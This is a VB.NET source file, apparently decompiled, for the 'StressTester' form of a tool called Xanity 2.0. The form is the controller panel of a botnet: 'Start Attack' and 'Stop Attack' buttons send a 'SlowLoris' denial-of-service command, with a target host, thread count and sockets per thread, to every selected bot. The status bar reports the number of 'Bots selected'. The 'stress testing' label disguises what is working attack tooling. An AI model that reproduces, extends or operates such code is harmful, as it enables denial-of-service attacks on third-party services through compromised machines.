Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Xanity_2._0.My

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class StressTester
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.StressTester_Load)
            StressTester.__ENCAddToList(Me)
            Me.z = 0
            Me.server = New API
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = StressTester.__ENCList
            SyncLock list
                If (StressTester.__ENCList.Count = StressTester.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (StressTester.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = StressTester.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                StressTester.__ENCList.Item(index) = StressTester.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    StressTester.__ENCList.RemoveRange(index, (StressTester.__ENCList.Count - index))
                    StressTester.__ENCList.Capacity = StressTester.__ENCList.Count
                End If
                StressTester.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub FlatButton1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim strArray3 As String() = New String((Me.z + 1)  - 1) {}
                Dim strArray2 As String() = New String((Me.z + 1)  - 1) {}
                Dim strArray As String() = New String((Me.z + 1)  - 1) {}
                Dim num4 As Integer = (MyProject.Forms.Form1.CountCharacter(Me.connected, "#"c) - 1)
                Dim i As Integer = 0
                Do While (i <= num4)
                    strArray(i) = Me.connected.Split(New Char() { "#"c })(i)
                    i += 1
                Loop
                Dim z As Integer = Me.z
                Dim j As Integer = 0
                Do While (j <= z)
                    strArray3(j) = strArray(j).Split(New Char() { "|"c })(0)
                    strArray2(j) = strArray(j).Split(New Char() { "|"c })(1)
                    j += 1
                Loop
                Dim num6 As Integer = Me.z
                Dim k As Integer = 0
                Do While (k <= num6)
                    Me.server.sendcmd(String.Concat(New String() { "SlowLoris|", Me.FlatTextBox1.Text, "|", Conversions.ToString(Me.FlatNumeric1.Value), "|", Conversions.ToString(Me.FlatNumeric2.Value) }), strArray3(k), strArray2(k))
                    k += 1
                Loop
                Me.FlatStatusBar1.Text = "Command sent!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured by sending the command!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub FlatButton2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim strArray3 As String() = New String((Me.z + 1)  - 1) {}
                Dim strArray2 As String() = New String((Me.z + 1)  - 1) {}
                Dim strArray As String() = New String((Me.z + 1)  - 1) {}
                Dim num4 As Integer = (MyProject.Forms.Form1.CountCharacter(Me.connected, "#"c) - 1)
                Dim i As Integer = 0
                Do While (i <= num4)
                    strArray(i) = Me.connected.Split(New Char() { "#"c })(i)
                    i += 1
                Loop
                Dim z As Integer = Me.z
                Dim j As Integer = 0
                Do While (j <= z)
                    strArray3(j) = strArray(j).Split(New Char() { "|"c })(0)
                    strArray2(j) = strArray(j).Split(New Char() { "|"c })(1)
                    j += 1
                Loop
                Dim num6 As Integer = Me.z
                Dim k As Integer = 0
                Do While (k <= num6)
                    Me.server.sendcmd("SLS", strArray3(k), strArray2(k))
                    k += 1
                Loop
                Me.FlatStatusBar1.Text = "Command sent!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured by sending the command!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(StressTester))
            Me.FormSkin1 = New FormSkin
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.FlatCloseSS1 = New FlatCloseSS
            Me.FlatMax1 = New FlatMax
            Me.FlatMini1 = New FlatMini
            Me.FlatGroupBox1 = New FlatGroupBox
            Me.FlatButton2 = New FlatButton
            Me.FlatButton1 = New FlatButton
            Me.FlatNumeric2 = New FlatNumeric
            Me.FlatLabel3 = New FlatLabel
            Me.FlatNumeric1 = New FlatNumeric
            Me.FlatLabel2 = New FlatLabel
            Me.FlatTextBox1 = New FlatTextBox
            Me.FlatLabel1 = New FlatLabel
            Me.FormSkin1.SuspendLayout
            Me.FlatGroupBox1.SuspendLayout
            Me.SuspendLayout
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.BorderColor = Color.FromArgb(&H35, &H3A, 60)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Controls.Add(Me.FlatCloseSS1)
            Me.FormSkin1.Controls.Add(Me.FlatMax1)
            Me.FormSkin1.Controls.Add(Me.FlatMini1)
            Me.FormSkin1.Controls.Add(Me.FlatGroupBox1)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.DeepPink
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            Dim size2 As New Size(&H130, &H157)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "Stress Testing"
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &H143)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(&H130, 20)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = 4
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Me.FlatCloseSS1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatCloseSS1.BackColor = Color.White
            Me.FlatCloseSS1.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.FlatCloseSS1.Font = New Font("Marlett", 10!)
            point2 = New Point(&H112, 12)
            Me.FlatCloseSS1.Location = point2
            Me.FlatCloseSS1.Name = "FlatCloseSS1"
            size2 = New Size(&H12, &H12)
            Me.FlatCloseSS1.Size = size2
            Me.FlatCloseSS1.TabIndex = 3
            Me.FlatCloseSS1.Text = "FlatCloseSS1"
            Me.FlatCloseSS1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMax1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMax1.BackColor = Color.White
            Me.FlatMax1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMax1.Enabled = False
            Me.FlatMax1.Font = New Font("Marlett", 12!)
            point2 = New Point(250, 12)
            Me.FlatMax1.Location = point2
            Me.FlatMax1.Name = "FlatMax1"
            size2 = New Size(&H12, &H12)
            Me.FlatMax1.Size = size2
            Me.FlatMax1.TabIndex = 2
            Me.FlatMax1.Text = "FlatMax1"
            Me.FlatMax1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMini1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMini1.BackColor = Color.White
            Me.FlatMini1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMini1.Font = New Font("Marlett", 12!)
            point2 = New Point(&HE2, 12)
            Me.FlatMini1.Location = point2
            Me.FlatMini1.Name = "FlatMini1"
            size2 = New Size(&H12, &H12)
            Me.FlatMini1.Size = size2
            Me.FlatMini1.TabIndex = 1
            Me.FlatMini1.Text = "FlatMini1"
            Me.FlatMini1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatGroupBox1.BackColor = Color.Transparent
            Me.FlatGroupBox1.BaseColor = Color.White
            Me.FlatGroupBox1.Controls.Add(Me.FlatButton2)
            Me.FlatGroupBox1.Controls.Add(Me.FlatButton1)
            Me.FlatGroupBox1.Controls.Add(Me.FlatNumeric2)
            Me.FlatGroupBox1.Controls.Add(Me.FlatLabel3)
            Me.FlatGroupBox1.Controls.Add(Me.FlatNumeric1)
            Me.FlatGroupBox1.Controls.Add(Me.FlatLabel2)
            Me.FlatGroupBox1.Controls.Add(Me.FlatTextBox1)
            Me.FlatGroupBox1.Controls.Add(Me.FlatLabel1)
            Me.FlatGroupBox1.Font = New Font("Segoe UI", 10!)
            point2 = New Point(3, &H35)
            Me.FlatGroupBox1.Location = point2
            Me.FlatGroupBox1.Name = "FlatGroupBox1"
            Me.FlatGroupBox1.ShowText = True
            size2 = New Size(&H12A, &H10C)
            Me.FlatGroupBox1.Size = size2
            Me.FlatGroupBox1.TabIndex = 0
            Me.FlatGroupBox1.Text = "Slowloris DOS"
            Me.FlatButton2.BackColor = Color.Transparent
            Me.FlatButton2.BaseColor = Color.DeepPink
            Me.FlatButton2.Cursor = Cursors.Hand
            Me.FlatButton2.Font = New Font("Segoe UI", 12!)
            point2 = New Point(170, &HDA)
            Me.FlatButton2.Location = point2
            Me.FlatButton2.Name = "FlatButton2"
            Me.FlatButton2.Rounded = False
            size2 = New Size(&H6A, &H20)
            Me.FlatButton2.Size = size2
            Me.FlatButton2.TabIndex = 7
            Me.FlatButton2.Text = "Stop Attack"
            Me.FlatButton2.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatButton1.BackColor = Color.Transparent
            Me.FlatButton1.BaseColor = Color.DeepPink
            Me.FlatButton1.Cursor = Cursors.Hand
            Me.FlatButton1.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H17, &HDA)
            Me.FlatButton1.Location = point2
            Me.FlatButton1.Name = "FlatButton1"
            Me.FlatButton1.Rounded = False
            size2 = New Size(&H6A, &H20)
            Me.FlatButton1.Size = size2
            Me.FlatButton1.TabIndex = 6
            Me.FlatButton1.Text = "Start Attack"
            Me.FlatButton1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatNumeric2.BackColor = Color.FromArgb(60, 70, &H49)
            Me.FlatNumeric2.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatNumeric2.ButtonColor = Color.DeepPink
            Me.FlatNumeric2.Font = New Font("Segoe UI", 10!)
            Me.FlatNumeric2.ForeColor = Color.White
            point2 = New Point(&H17, &HB2)
            Me.FlatNumeric2.Location = point2
            Me.FlatNumeric2.Maximum = 150
            Me.FlatNumeric2.Minimum = 0
            Me.FlatNumeric2.Name = "FlatNumeric2"
            size2 = New Size(&HFD, 30)
            Me.FlatNumeric2.Size = size2
            Me.FlatNumeric2.TabIndex = 5
            Me.FlatNumeric2.Text = "FlatNumeric2"
            Me.FlatNumeric2.Value = 70
            Me.FlatLabel3.AutoSize = True
            Me.FlatLabel3.BackColor = Color.Transparent
            Me.FlatLabel3.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel3.ForeColor = Color.Black
            point2 = New Point(20, &HA2)
            Me.FlatLabel3.Location = point2
            Me.FlatLabel3.Name = "FlatLabel3"
            size2 = New Size(&H6F, 13)
            Me.FlatLabel3.Size = size2
            Me.FlatLabel3.TabIndex = 4
            Me.FlatLabel3.Text = "Amount of Threads: "
            Me.FlatNumeric1.BackColor = Color.FromArgb(60, 70, &H49)
            Me.FlatNumeric1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatNumeric1.ButtonColor = Color.DeepPink
            Me.FlatNumeric1.Font = New Font("Segoe UI", 10!)
            Me.FlatNumeric1.ForeColor = Color.White
            point2 = New Point(&H17, &H73)
            Me.FlatNumeric1.Location = point2
            Me.FlatNumeric1.Maximum = 100
            Me.FlatNumeric1.Minimum = 0
            Me.FlatNumeric1.Name = "FlatNumeric1"
            size2 = New Size(&HFD, 30)
            Me.FlatNumeric1.Size = size2
            Me.FlatNumeric1.TabIndex = 3
            Me.FlatNumeric1.Text = "FlatNumeric1"
            Me.FlatNumeric1.Value = 100
            Me.FlatLabel2.AutoSize = True
            Me.FlatLabel2.BackColor = Color.Transparent
            Me.FlatLabel2.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel2.ForeColor = Color.Black
            point2 = New Point(20, &H63)
            Me.FlatLabel2.Location = point2
            Me.FlatLabel2.Name = "FlatLabel2"
            size2 = New Size(100, 13)
            Me.FlatLabel2.Size = size2
            Me.FlatLabel2.TabIndex = 2
            Me.FlatLabel2.Text = "Socks per Thread: "
            Me.FlatTextBox1.BackColor = Color.Transparent
            point2 = New Point(&H17, &H38)
            Me.FlatTextBox1.Location = point2
            Me.FlatTextBox1.MaxLength = &H7FFF
            Me.FlatTextBox1.Multiline = False
            Me.FlatTextBox1.Name = "FlatTextBox1"
            Me.FlatTextBox1.ReadOnly = False
            size2 = New Size(&HFD, &H1D)
            Me.FlatTextBox1.Size = size2
            Me.FlatTextBox1.TabIndex = 1
            Me.FlatTextBox1.Text = "http://example.com"
            Me.FlatTextBox1.TextAlign = HorizontalAlignment.Left
            Me.FlatTextBox1.TextColor = Color.White
            Me.FlatTextBox1.UseSystemPasswordChar = False
            Me.FlatLabel1.AutoSize = True
            Me.FlatLabel1.BackColor = Color.Transparent
            Me.FlatLabel1.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel1.ForeColor = Color.Black
            point2 = New Point(20, 40)
            Me.FlatLabel1.Location = point2
            Me.FlatLabel1.Name = "FlatLabel1"
            size2 = New Size(&H8D, 13)
            Me.FlatLabel1.Size = size2
            Me.FlatLabel1.TabIndex = 0
            Me.FlatLabel1.Text = "IP-Address or Host-Name: "
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(&H130, &H157)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "StressTester"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "StressTester"
            Me.TransparencyKey = Color.Fuchsia
            Me.FormSkin1.ResumeLayout(False)
            Me.FlatGroupBox1.ResumeLayout(False)
            Me.FlatGroupBox1.PerformLayout
            Me.ResumeLayout(False)
        End Sub

        Private Sub StressTester_Load(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim num As Integer
                Me.z = (MyProject.Forms.Form1.CountCharacter(Me.connected, "#"c) - 1)
                Dim strArray As String() = New String((Me.z + 1)  - 1) {}
                Dim num3 As Integer = (MyProject.Forms.Form1.CountCharacter(Me.connected, "#"c) - 1)
                Dim i As Integer = 0
                Do While (i <= num3)
                    num += 1
                    strArray(i) = Me.connected.Split(New Char() { "#"c })(i)
                    i += 1
                Loop
                Me.FlatStatusBar1.Text = ("Bots selected: " & Conversions.ToString(num))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub


        ' Properties
        Friend Overridable Property FlatButton1 As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatButton1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FlatButton1_Click)
                If (Not Me._FlatButton1 Is Nothing) Then
                    RemoveHandler Me._FlatButton1.Click, handler
                End If
                Me._FlatButton1 = value
                If (Not Me._FlatButton1 Is Nothing) Then
                    AddHandler Me._FlatButton1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatButton2 As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatButton2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FlatButton2_Click)
                If (Not Me._FlatButton2 Is Nothing) Then
                    RemoveHandler Me._FlatButton2.Click, handler
                End If
                Me._FlatButton2 = value
                If (Not Me._FlatButton2 Is Nothing) Then
                    AddHandler Me._FlatButton2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatCloseSS1 As FlatCloseSS
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatCloseSS1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCloseSS)
                Me._FlatCloseSS1 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox1 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel2 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel2 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel3 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel3 = value
            End Set
        End Property

        Friend Overridable Property FlatMax1 As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMax1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._FlatMax1 = value
            End Set
        End Property

        Friend Overridable Property FlatMini1 As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMini1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._FlatMini1 = value
            End Set
        End Property

        Friend Overridable Property FlatNumeric1 As FlatNumeric
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatNumeric1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatNumeric)
                Me._FlatNumeric1 = value
            End Set
        End Property

        Friend Overridable Property FlatNumeric2 As FlatNumeric
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatNumeric2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatNumeric)
                Me._FlatNumeric2 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FlatTextBox1 As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatTextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._FlatTextBox1 = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("FlatButton1")> _
        Private _FlatButton1 As FlatButton
        <AccessedThroughProperty("FlatButton2")> _
        Private _FlatButton2 As FlatButton
        <AccessedThroughProperty("FlatCloseSS1")> _
        Private _FlatCloseSS1 As FlatCloseSS
        <AccessedThroughProperty("FlatGroupBox1")> _
        Private _FlatGroupBox1 As FlatGroupBox
        <AccessedThroughProperty("FlatLabel1")> _
        Private _FlatLabel1 As FlatLabel
        <AccessedThroughProperty("FlatLabel2")> _
        Private _FlatLabel2 As FlatLabel
        <AccessedThroughProperty("FlatLabel3")> _
        Private _FlatLabel3 As FlatLabel
        <AccessedThroughProperty("FlatMax1")> _
        Private _FlatMax1 As FlatMax
        <AccessedThroughProperty("FlatMini1")> _
        Private _FlatMini1 As FlatMini
        <AccessedThroughProperty("FlatNumeric1")> _
        Private _FlatNumeric1 As FlatNumeric
        <AccessedThroughProperty("FlatNumeric2")> _
        Private _FlatNumeric2 As FlatNumeric
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FlatTextBox1")> _
        Private _FlatTextBox1 As FlatTextBox
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        Private components As IContainer
        Public connected As String
        Private server As API
        Private z As Integer
    End Class
End Namespace

